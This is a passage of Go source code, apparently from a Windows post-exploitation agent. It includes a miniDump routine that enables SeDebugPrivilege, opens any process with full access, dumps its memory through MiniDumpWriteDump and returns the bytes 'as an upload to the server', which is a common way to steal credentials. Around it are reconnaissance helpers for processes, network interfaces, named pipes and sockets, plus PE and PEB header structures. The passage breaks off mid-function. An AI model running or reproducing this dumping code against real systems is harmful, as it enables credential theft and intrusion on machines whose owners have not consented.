// TODO always close handle during exception handling

// miniDump will attempt to perform use the Windows MiniDumpWriteDump API operation on the provided process, and returns
// the raw bytes of the dumpfile back as an upload to the server.
// Touches disk during the dump process, in the OS default temporary or provided temporary directory
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
	var mini map[string]interface{}
	mini = make(map[string]interface{})
	var err error

	// Make sure temporary directory exists before executing miniDump functionality
	if tempDir != "" {
		d, errS := os.Stat(tempDir)
		if os.IsNotExist(errS) {
			return mini, fmt.Errorf("the provided directory does not exist: %s", tempDir)
		}
		if d.IsDir() != true {
			return mini, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
		}
	} else {
		tempDir = os.TempDir()
	}

	// Get the process PID or name
	mini["ProcName"], mini["ProcID"], err = getProcess(process, inPid)
	if err != nil {
		return mini, err
	}

	// Get debug privs (required for dumping processes not owned by current user)
	err = sePrivEnable("SeDebugPrivilege")
	if err != nil {
		return mini, err
	}

	// Get a handle to process
	hProc, err := syscall.OpenProcess(0x1F0FFF, false, mini["ProcID"].(uint32)) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
	if err != nil {
		return mini, err
	}

	// Set up the temporary file to write to, automatically remove it once done
	// TODO: Work out how to do this in memory
	f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
	if tempErr != nil {
		return mini, tempErr
	}

	// Remove the file after the function exits, regardless of error nor not
	defer os.Remove(f.Name())

	// Load MiniDumpWriteDump function from DbgHelp.dll
	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
	miniDump := k32.NewProc("MiniDumpWriteDump")

	/*
		BOOL MiniDumpWriteDump(
		  HANDLE                            hProcess,
		  DWORD                             ProcessId,
		  HANDLE                            hFile,
		  MINIDUMP_TYPE                     DumpType,
		  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
		  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
		);
	*/
	// Call Windows MiniDumpWriteDump API
	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(mini["ProcID"].(uint32)), f.Fd(), 3, 0, 0, 0)

	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does

	if r != 0 {
		mini["FileContent"], err = ioutil.ReadFile(f.Name())
		if err != nil {
			f.Close()
			return mini, err
		}
	}
	return mini, nil
}

// getProcess takes in a process name OR a process ID and returns a pointer to the process handle, the process name,
// and the process ID.
func getProcess(name string, pid uint32) (string, uint32, error) {
	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go

	if pid <= 0 && name == "" {
		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
	}

	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if snapshotHandle < 0 || err != nil {
		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
	}
	defer syscall.CloseHandle(snapshotHandle)

	var process syscall.ProcessEntry32
	process.Size = uint32(unsafe.Sizeof(process))
	err = syscall.Process32First(snapshotHandle, &process)
	if err != nil {
		return "", 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
	}

	for {
		processName := ""
		// Iterate over characters to build a full string
		for _, chr := range process.ExeFile {
			if chr != 0 {
				processName = processName + string(int(chr))
			}
		}
		if pid > 0 {
			if process.ProcessID == pid {
				return processName, pid, nil
			}
		} else if name != "" {
			if processName == name {
				return name, process.ProcessID, nil
			}
		}
		err = syscall.Process32Next(snapshotHandle, &process)
		if err != nil {
			break
		}
	}
	return "", 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
}

// Ifconfig in Windows requires an API call to get all the information we want
// Much of this is ripped from interface_windows.go
func HostIfconfig() (stdout string, err error) {
	fSize := uint32(0)
	b := make([]byte, 1000)

	ifaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}

	var adapterInfo *syscall.IpAdapterInfo
	adapterInfo = (*syscall.IpAdapterInfo)(unsafe.Pointer(&b[0]))
	err = syscall.GetAdaptersInfo(adapterInfo, &fSize)

	// Call it once to see how much data you need in fSize
	if err == syscall.ERROR_BUFFER_OVERFLOW {
		b := make([]byte, fSize)
		adapterInfo = (*syscall.IpAdapterInfo)(unsafe.Pointer(&b[0]))
		err = syscall.GetAdaptersInfo(adapterInfo, &fSize)
		if err != nil {
			return "", err
		}
	}

	for _, iface := range ifaces {
		for ainfo := adapterInfo; ainfo != nil; ainfo = ainfo.Next {
			if int(ainfo.Index) == iface.Index {
				stdout += fmt.Sprintf("%s\n", iface.Name)
				stdout += fmt.Sprintf("  MAC Address\t%s\n", iface.HardwareAddr.String())
				ipentry := &ainfo.IpAddressList
				for ; ipentry != nil; ipentry = ipentry.Next {
					stdout += fmt.Sprintf("  IP Address\t%s\n", ipentry.IpAddress.String)
					stdout += fmt.Sprintf("  Subnet Mask\t%s\n", ipentry.IpMask.String)
				}
				gateways := &ainfo.GatewayList
				for ; gateways != nil; gateways = gateways.Next {
					stdout += fmt.Sprintf("  Gateway\t%s\n", gateways.IpAddress.String)
				}

				if ainfo.DhcpEnabled != 0 {
					stdout += fmt.Sprintf("  DHCP\t\tEnabled\n")
					dhcpServers := &ainfo.DhcpServer
					for ; dhcpServers != nil; dhcpServers = dhcpServers.Next {
						stdout += fmt.Sprintf("  DHCP Server:\t%s\n", dhcpServers.IpAddress.String)
					}
				} else {
					stdout += fmt.Sprintf("  DHCP\t\tDisabled\n")
				}
				stdout += "\n"
			}
		}
	}

	return stdout, nil
}

// sePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
func sePrivEnable(s string) error {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	type LUID_AND_ATTRIBUTES struct {
		Luid       LUID
		Attributes uint32
	}
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}

	modadvapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}
	syscall.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	r, _, e := procLookupPriv.Call(
		uintptr(0), //LPCWSTR lpSystemName,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s))), //LPCWSTR lpName,
		uintptr(unsafe.Pointer(&luid)),                       //PLUID   lpLuid
	)
	if r == 0 {
		return e
	}
	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
	privs := TOKEN_PRIVILEGES{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	//AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)
	r, _, e = procAdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		uintptr(0),
		uintptr(unsafe.Pointer(&privs)),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)
	if r == 0 {
		return e
	}
	return nil
}

// Query the child process and find its image base address from its Process Environment Block (PEB)
// https://github.com/winlabs/gowin32/blob/0b6f3bef0b7501b26caaecab8d52b09813224373/wrappers/winternl.go#L37
// http://bytepointer.com/resources/tebpeb32.htm
// https://www.nirsoft.net/kernel_struct/vista/PEB.html
type PEB struct {
	//reserved1              [2]byte     // BYTE 0-1
	InheritedAddressSpace    byte    // BYTE	0
	ReadImageFileExecOptions byte    // BYTE	1
	BeingDebugged            byte    // BYTE	2
	reserved2                [1]byte // BYTE 3
	// ImageUsesLargePages          : 1;   //0x0003:0 (WS03_SP1+)
	// IsProtectedProcess           : 1;   //0x0003:1 (Vista+)
	// IsLegacyProcess              : 1;   //0x0003:2 (Vista+)
	// IsImageDynamicallyRelocated  : 1;   //0x0003:3 (Vista+)
	// SkipPatchingUser32Forwarders : 1;   //0x0003:4 (Vista_SP1+)
	// IsPackagedProcess            : 1;   //0x0003:5 (Win8_BETA+)
	// IsAppContainer               : 1;   //0x0003:6 (Win8_RTM+)
	// SpareBit                     : 1;   //0x0003:7
	//reserved3              [2]uintptr  // PVOID BYTE 4-8
	Mutant                 uintptr     // BYTE 4
	ImageBaseAddress       uintptr     // BYTE 8
	Ldr                    uintptr     // PPEB_LDR_DATA
	ProcessParameters      uintptr     // PRTL_USER_PROCESS_PARAMETERS
	reserved4              [3]uintptr  // PVOID
	AtlThunkSListPtr       uintptr     // PVOID
	reserved5              uintptr     // PVOID
	reserved6              uint32      // ULONG
	reserved7              uintptr     // PVOID
	reserved8              uint32      // ULONG
	AtlThunkSListPtr32     uint32      // ULONG
	reserved9              [45]uintptr // PVOID
	reserved10             [96]byte    // BYTE
	PostProcessInitRoutine uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
	reserved11             [128]byte   // BYTE
	reserved12             [1]uintptr  // PVOID
	SessionId              uint32      // ULONG
}

// https://github.com/elastic/go-windows/blob/master/ntdll.go#L77
type PROCESS_BASIC_INFORMATION struct {
	reserved1                    uintptr    // PVOID
	PebBaseAddress               uintptr    // PPEB
	reserved2                    [2]uintptr // PVOID
	UniqueProcessId              uintptr    // ULONG_PTR
	InheritedFromUniqueProcessID uintptr    // PVOID
}

// Read the child program's DOS header and validate it is a MZ executable
type IMAGE_DOS_HEADER struct {
	Magic    uint16     // USHORT Magic number
	Cblp     uint16     // USHORT Bytes on last page of file
	Cp       uint16     // USHORT Pages in file
	Crlc     uint16     // USHORT Relocations
	Cparhdr  uint16     // USHORT Size of header in paragraphs
	MinAlloc uint16     // USHORT Minimum extra paragraphs needed
	MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
	SS       uint16     // USHORT Initial (relative) SS value
	SP       uint16     // USHORT Initial SP value
	CSum     uint16     // USHORT Checksum
	IP       uint16     // USHORT Initial IP value
	CS       uint16     // USHORT Initial (relative) CS value
	LfaRlc   uint16     // USHORT File address of relocation table
	Ovno     uint16     // USHORT Overlay number
	Res      [4]uint16  // USHORT Reserved words
	OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
	OEMInfo  uint16     // USHORT OEM information; e_oemid specific
	Res2     [10]uint16 // USHORT Reserved words
	LfaNew   int32      // LONG File address of new exe header
}

// Read the child process's PE file header
/*
	typedef struct _IMAGE_FILE_HEADER {
		USHORT  Machine;
		USHORT  NumberOfSections;
		ULONG   TimeDateStamp;
		ULONG   PointerToSymbolTable;
		ULONG   NumberOfSymbols;
		USHORT  SizeOfOptionalHeader;
		USHORT  Characteristics;
	} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
*/

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

// Read the child process's PE optional header to find it's entry point
/*
	https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header64
	typedef struct _IMAGE_OPTIONAL_HEADER64 {
	WORD                 Magic;
	BYTE                 MajorLinkerVersion;
	BYTE                 MinorLinkerVersion;
	DWORD                SizeOfCode;
	DWORD                SizeOfInitializedData;
	DWORD                SizeOfUninitializedData;
	DWORD                AddressOfEntryPoint;
	DWORD                BaseOfCode;
	ULONGLONG            ImageBase;
	DWORD                SectionAlignment;
	DWORD                FileAlignment;
	WORD                 MajorOperatingSystemVersion;
	WORD                 MinorOperatingSystemVersion;
	WORD                 MajorImageVersion;
	WORD                 MinorImageVersion;
	WORD                 MajorSubsystemVersion;
	WORD                 MinorSubsystemVersion;
	DWORD                Win32VersionValue;
	DWORD                SizeOfImage;
	DWORD                SizeOfHeaders;
	DWORD                CheckSum;
	WORD                 Subsystem;
	WORD                 DllCharacteristics;
	ULONGLONG            SizeOfStackReserve;
	ULONGLONG            SizeOfStackCommit;
	ULONGLONG            SizeOfHeapReserve;
	ULONGLONG            SizeOfHeapCommit;
	DWORD                LoaderFlags;
	DWORD                NumberOfRvaAndSizes;
	IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
	} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
*/

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}

/*
	https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32
	typedef struct _IMAGE_OPTIONAL_HEADER {
	WORD                 Magic;
	BYTE                 MajorLinkerVersion;
	BYTE                 MinorLinkerVersion;
	DWORD                SizeOfCode;
	DWORD                SizeOfInitializedData;
	DWORD                SizeOfUninitializedData;
	DWORD                AddressOfEntryPoint;
	DWORD                BaseOfCode;
	DWORD                BaseOfData;
	DWORD                ImageBase;
	DWORD                SectionAlignment;
	DWORD                FileAlignment;
	WORD                 MajorOperatingSystemVersion;
	WORD                 MinorOperatingSystemVersion;
	WORD                 MajorImageVersion;
	WORD                 MinorImageVersion;
	WORD                 MajorSubsystemVersion;
	WORD                 MinorSubsystemVersion;
	DWORD                Win32VersionValue;
	DWORD                SizeOfImage;
	DWORD                SizeOfHeaders;
	DWORD                CheckSum;
	WORD                 Subsystem;
	WORD                 DllCharacteristics;
	DWORD                SizeOfStackReserve;
	DWORD                SizeOfStackCommit;
	DWORD                SizeOfHeapReserve;
	DWORD                SizeOfHeapCommit;
	DWORD                LoaderFlags;
	DWORD                NumberOfRvaAndSizes;
	IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
	} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
*/

type IMAGE_OPTIONAL_HEADER32 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	BaseOfData                  uint32 // Different from 64 bit header
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}

// Print out the comments of \\.\pipe\*
// Ripped straight out of the Wireguard implementation: conn_windows.go
func Pipes() (stdout string, stderr string) {
	var (
		data windows.Win32finddata
	)

	h, err := windows.FindFirstFile(
		// Append * to find all named pipes.
		windows.StringToUTF16Ptr(pipePrefix+"*"),
		&data,
	)
	if err != nil {
		return "", err.Error()
	}

	// FindClose is used to close file search handles instead of the typical
	// CloseHandle used elsewhere, see:
	// https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findclose.
	defer windows.FindClose(h)

	stdout = "Named pipes:\n"
	for {
		name := windows.UTF16ToString(data.FileName[:])
		stdout += pipePrefix + name + "\n"

		if err := windows.FindNextFile(h, &data); err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}

			return "", err.Error()
		}
	}

	return stdout, ""
}

//BEGIN PS CODE
type Process1 interface {
	// Pid is the process ID for this process.
	Pid() int

	// PPid is the parent process ID for this process.
	PPid() int

	// Executable name running this process. This is not a path to the
	// executable.
	Executable() string

	Owner() string

	Arch() string
}

// WindowsProcess is an implementation of Process for Windows.
type WindowsProcess struct {
	pid   int
	ppid  int
	exe   string
	owner string
	arch  string
}

func (p *WindowsProcess) Pid() int {
	return p.pid
}

func (p *WindowsProcess) PPid() int {
	return p.ppid
}

func (p *WindowsProcess) Executable() string {
	return p.exe
}

func (p *WindowsProcess) Owner() string {
	return p.owner
}

func (p *WindowsProcess) Arch() string {
	return p.arch
}

func newWindowsProcess(e *syscall.ProcessEntry32) *WindowsProcess {
	// Find when the string ends for decoding
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}
	account, _ := getProcessOwner(e.ProcessID)

	// Check if this bad boy is 64 bit or not
	pHandle, _ := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, e.ProcessID)
	defer syscall.CloseHandle(pHandle)
	isWow64Process, err := IsWow64Process(pHandle)

	arch := "x86"
	if !isWow64Process {
		arch = "x64"
	}

	if err != nil {
		arch = "err"
	}

	return &WindowsProcess{
		pid:   int(e.ProcessID),
		ppid:  int(e.ParentProcessID),
		exe:   syscall.UTF16ToString(e.ExeFile[:end]),
		owner: account,
		arch:  arch,
	}
}

func findProcess(pid int) (Process1, error) {
	ps, err := processes()
	if err != nil {
		return nil, err
	}

	for _, p := range ps {
		if p.Pid() == pid {
			return p, nil
		}
	}

	return nil, nil
}

// getInfo retrieves a specified type of information about an access token.
func getInfo(t syscall.Token, class uint32, initSize int) (unsafe.Pointer, error) {
	n := uint32(initSize)
	for {
		b := make([]byte, n)
		e := syscall.GetTokenInformation(t, class, &b[0], uint32(len(b)), &n)
		if e == nil {
			return unsafe.Pointer(&b[0]), nil
		}
		if e != syscall.ERROR_INSUFFICIENT_BUFFER {
			return nil, e
		}
		if n <= uint32(len(b)) {
			return nil, e
		}
	}
}

// getTokenOwner retrieves access token t owner account information.
func getTokenOwner(t syscall.Token) (*syscall.Tokenuser, error) {
	i, e := getInfo(t, syscall.TokenOwner, 50)
	if e != nil {
		return nil, e
	}
	return (*syscall.Tokenuser)(i), nil
}

func getProcessOwner(pid uint32) (owner string, err error) {
	handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return
	}
	defer syscall.CloseHandle(handle)
	var token syscall.Token
	if err = syscall.OpenProcessToken(handle, syscall.TOKEN_QUERY, &token); err != nil {
		return
	}
	tokenUser, err := getTokenOwner(token)
	if err != nil {
		return
	}
	owner, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	owner = fmt.Sprintf("%s\\%s", domain, owner)
	return
}

func processes() ([]Process1, error) {
	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(handle)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err = syscall.Process32First(handle, &entry); err != nil {
		return nil, err
	}

	results := make([]Process1, 0, 50)
	for {
		results = append(results, newWindowsProcess(&entry))

		err = syscall.Process32Next(handle, &entry)
		if err != nil {
			break
		}
	}

	return results, nil
}

// https://github.com/shenwei356/rush/blob/master/process/process_windows.go
func IsWow64Process(processHandle syscall.Handle) (bool, error) {
	var wow64Process bool
	r1, _, e1 := procIsWow64Process.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&wow64Process)))
	if int(r1) == 0 {
		return false, e1
	}
	return wow64Process, nil
}

func Ps() (stdout string, stderr string) {
	processList, err := processes()
	if err != nil {
		stderr += fmt.Sprintf("ps.Processes() failed\n")
		return "", stderr
	}

	stdout += fmt.Sprintf("PID\tPPID\tARCH\tOWNER\tEXE\n")
	for x := range processList {
		var process Process1
		process = processList[x]
		stdout += fmt.Sprintf("%d\t%d\t%s\t%s\t%s\n", process.Pid(), process.PPid(), process.Arch(), process.Owner(), process.Executable())
	}
	return stdout, ""
}

//END PS CODE

//BEGIN NETSTAT CODE
// SockAddr represents an ip:port pair
type SockAddr struct {
	IP   net.IP
	Port uint16
}

func (s *SockAddr) String() string {
	return fmt.Sprintf("%v:%d", s.IP, s.Port)
}

// SockTabEntry type represents each line of the /proc/net/[tcp|udp]
type SockTabEntry struct {
	ino        string
	LocalAddr  *SockAddr
	RemoteAddr *SockAddr
	State      SkState
	UID        uint32
	Process    *Process
}

// Process holds the PID and process name to which each socket belongs
type Process struct {
	Pid  int
	Name string
}

func (p *Process) String() string {
	return fmt.Sprintf("%d/%s", p.Pid, p.Name)
}

// SkState type represents socket connection state
type SkState uint8

func (s SkState) String() string {
	return skStates[s]
}

// AcceptFn is used to filter socket entries. The value returned indicates
// whether the element is to be appended to the socket list.
type AcceptFn func(*SockTabEntry) bool

// NoopFilter - a test function returning true for all elements
func NoopFilter(*SockTabEntry) bool { return true }

// TCPSocks returns a slice of active TCP sockets containing only those
// elements that satisfy the accept function
func TCPSocks(accept AcceptFn) ([]SockTabEntry, error) {
	return osTCPSocks(accept)
}

// TCP6Socks returns a slice of active TCP IPv4 sockets containing only those
// elements that satisfy the accept function
func TCP6Socks(accept AcceptFn) ([]SockTabEntry, error) {
	return osTCP6Socks(accept)
}

// UDPSocks returns a slice of active UDP sockets containing only those
// elements that satisfy the accept function
func UDPSocks(accept AcceptFn) ([]SockTabEntry, error) {
	return osUDPSocks(accept)
}

// UDP6Socks returns a slice of active UDP IPv6 sockets containing only those
// elements that satisfy the accept function
func UDP6Socks(accept AcceptFn) ([]SockTabEntry, error) {
	return osUDP6Socks(accept)
}

const (
	errInsuffBuff = syscall.Errno(122)

	Th32csSnapProcess  = uint32(0x00000002)
	InvalidHandleValue = ^uintptr(0)
	MaxPath            = 260
)

var (
	modiphlpapi = syscall.NewLazyDLL("Iphlpapi.dll")
	modkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procGetTCPTable2        = modiphlpapi.NewProc("GetTcpTable2")
	procGetTCP6Table2       = modiphlpapi.NewProc("GetTcp6Table2")
	procGetExtendedUDPTable = modiphlpapi.NewProc("GetExtendedUdpTable")
	procCreateSnapshot      = modkernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First      = modkernel32.NewProc("Process32First")
	procProcess32Next       = modkernel32.NewProc("Process32Next")
	procIsWow64Process      = modkernel32.NewProc("IsWow64Process")
)

// Socket states
const (
	Close       SkState = 0x01
	Listen              = 0x02
	SynSent             = 0x03
	SynRecv             = 0x04
	Established         = 0x05
	FinWait1            = 0x06
	FinWait2            = 0x07
	CloseWait           = 0x08
	Closing             = 0x09
	LastAck             = 0x0a
	TimeWait            = 0x0b
	DeleteTcb           = 0x0c
)

var skStates = [...]string{
	"UNKNOWN",
	"", // CLOSE
	"LISTEN",
	"SYN_SENT",
	"SYN_RECV",
	"ESTABLISHED",
	"FIN_WAIT1",
	"FIN_WAIT2",
	"CLOSE_WAIT",
	"CLOSING",
	"LAST_ACK",
	"TIME_WAIT",
	"DELETE_TCB",
}

func memToIPv4(p unsafe.Pointer) net.IP {
	a := (*[net.IPv4len]byte)(p)
	ip := make(net.IP, net.IPv4len)
	copy(ip, a[:])
	return ip
}

func memToIPv6(p unsafe.Pointer) net.IP {
	a := (*[net.IPv6len]byte)(p)
	ip := make(net.IP, net.IPv6len)
	copy(ip, a[:])
	return ip
}

func memtohs(n unsafe.Pointer) uint16 {
	return binary.BigEndian.Uint16((*[2]byte)(n)[:])
}

type WinSock struct {
	Addr uint32
	Port uint32
}

func (w *WinSock) Sock() *SockAddr {
	ip := memToIPv4(unsafe.Pointer(&w.Addr))
	port := memtohs(unsafe.Pointer(&w.Port))
	return &SockAddr{IP: ip, Port: port}
}

type WinSock6 struct {
	Addr    [net.IPv6len]byte
	ScopeID uint32
	Port    uint32
}

func (w *WinSock6) Sock() *SockAddr {
	ip := memToIPv6(unsafe.Pointer(&w.Addr[0]))
	port := memtohs(unsafe.Pointer(&w.Port))
	return &SockAddr{IP: ip, Port: port}
}

type MibTCPRow2 struct {
	State      uint32
	LocalAddr  WinSock
	RemoteAddr WinSock
	WinPid
	OffloadState uint32
}

type WinPid uint32

func (pid WinPid) Process(snp ProcessSnapshot) *Process {
	if pid < 1 {
		return nil
	}
	return &Process{
		Pid:  int(pid),
		Name: snp.ProcPIDToName(uint32(pid)),
	}
}

func (m *MibTCPRow2) LocalSock() *SockAddr  { return m.LocalAddr.Sock() }
func (m *MibTCPRow2) RemoteSock() *SockAddr { return m.RemoteAddr.Sock() }
func (m *MibTCPRow2) SockState() SkState    { return SkState(m.State) }

type MibTCPTable2 struct {
	NumEntries uint32
	Table      [1]MibTCPRow2
}

func (t *MibTCPTable2) Rows() []MibTCPRow2 {
	var s []MibTCPRow2
	hdr := (*reflect.SliceHeader)(unsafe.Pointer(&s))
	hdr.Data = uintptr(unsafe.Pointer(&t.Table[0]))
	hdr.Len = int(t.NumEntries)
	hdr.Cap = int(t.NumEntries)
	return s
}

// MibTCP6Row2 structure contains information that describes an IPv6 TCP
// connection.
type MibTCP6Row2 struct {
	LocalAddr  WinSock6
	RemoteAddr WinSock6
	State      uint32
	WinPid
	OffloadState uint32
}

func (m *MibTCP6Row2) LocalSock() *SockAddr  { return m.LocalAddr.Sock() }
func (m *MibTCP6Row2) RemoteSock() *SockAddr { return m.RemoteAddr.Sock() }
func (m *MibTCP6Row2) SockState() SkState    { return SkState(m.State) }

// MibTCP6Table2 structure contains a table of IPv6 TCP connections on the
// local computer.
type MibTCP6Table2 struct {
	NumEntries uint32
	Table      [1]MibTCP6Row2
}

func (t *MibTCP6Table2) Rows() []MibTCP6Row2 {
	var s []MibTCP6Row2
	hdr := (*reflect.SliceHeader)(unsafe.Pointer(&s))
	hdr.Data = uintptr(unsafe.Pointer(&t.Table[0]))
	hdr.Len = int(t.NumEntries)
	hdr.Cap = int(t.NumEntries)
	return s
}

// MibUDPRowOwnerPID structure contains an entry from the User Datagram
// Protocol (UDP) listener table for IPv4 on the local computer. The entry also
// includes the process ID (PID) that issued the call to the bind function for
// the UDP endpoint
type MibUDPRowOwnerPID struct {
	WinSock
	WinPid
}

func (m *MibUDPRowOwnerPID) LocalSock() *SockAddr  { return m.Sock() }
func (m *MibUDPRowOwnerPID) RemoteSock() *SockAddr { return &SockAddr{net.IPv4zero, 0} }
func (m *MibUDPRowOwnerPID) SockState() SkState    { return Close }

// MibUDPTableOwnerPID structure contains the User Datagram Protocol (UDP)
// listener table for IPv4 on the local computer. The table also includes the
// process ID (PID) that issued the call to the bind function for each UDP
// endpoint.
type MibUDPTableOwnerPID struct {
	NumEntries uint32
	Table      [1]MibUDPRowOwnerPID
}

func (t *MibUDPTableOwnerPID) Rows() []MibUDPRowOwnerPID {
	var s []MibUDPRowOwnerPID
	hdr := (*reflect.SliceHeader)(unsafe.Pointer(&s))
	hdr.Data = uintptr(unsafe.Pointer(&t.Table[0]))
	hdr.Len = int(t.NumEntries)
	hdr.Cap = int(t.NumEntries)
	return s
}

// MibUDP6RowOwnerPID serves the same purpose as MibUDPRowOwnerPID, except that
// the information in this case is for IPv6.
type MibUDP6RowOwnerPID struct {
	WinSock6
	WinPid
}

func (m *MibUDP6RowOwnerPID) LocalSock() *SockAddr  { return m.Sock() }
func (m *MibUDP6RowOwnerPID) RemoteSock() *SockAddr { return &SockAddr{net.IPv4zero, 0} }
func (m *MibUDP6RowOwnerPID) SockState() SkState    { return Close }

// MibUDP6TableOwnerPID serves the same purpose as MibUDPTableOwnerPID for IPv6
type MibUDP6TableOwnerPID struct {
	NumEntries uint32
	Table      [1]MibUDP6RowOwnerPID
}

func (t *MibUDP6TableOwnerPID) Rows() []MibUDP6RowOwnerPID {
	var s []MibUDP6RowOwnerPID
	hdr := (*reflect.SliceHeader)(unsafe.Pointer(&s))
	hdr.Data = uintptr(unsafe.Pointer(&t.Table[0]))
	hdr.Len = int(t.NumEntries)
	hdr.Cap = int(t.NumEntries)
	return s
}

// Processentry32 describes an entry from a list of the processes residing in
// the system address space when a snapshot was taken
type Processentry32 struct {
	Size                uint32
	CntUsage            uint32
	Th32ProcessID       uint32
	Th32DefaultHeapID   uintptr
	Th32ModuleID        uint32
	CntThreads          uint32
	Th32ParentProcessID uint32
	PriClassBase        int32
	Flags               uint32
	ExeFile             [MaxPath]byte
}

func rawGetTCPTable2(proc uintptr, tab unsafe.Pointer, size *uint32, order bool) error {
	var oint uintptr
	if order {
		oint = 1
	}
	r1, _, callErr := syscall.Syscall(
		proc,
		uintptr(3),
		uintptr(tab),
		uintptr(unsafe.Pointer(size)),
		oint)
	if callErr != 0 {
		return callErr
	}
	if r1 != 0 {
		return syscall.Errno(r1)
	}
	return nil
}

func getTCPTable2(proc uintptr, order bool) ([]byte, error) {
	var (
		size uint32
		buf  []byte
	)

	// determine size
	err := rawGetTCPTable2(proc, unsafe.Pointer(nil), &size, false)
	if err != nil && err != errInsuffBuff {
		return nil, err
	}
	buf = make([]byte, size)
	table := unsafe.Pointer(&buf[0])
	err = rawGetTCPTable2(proc, table, &size, true)
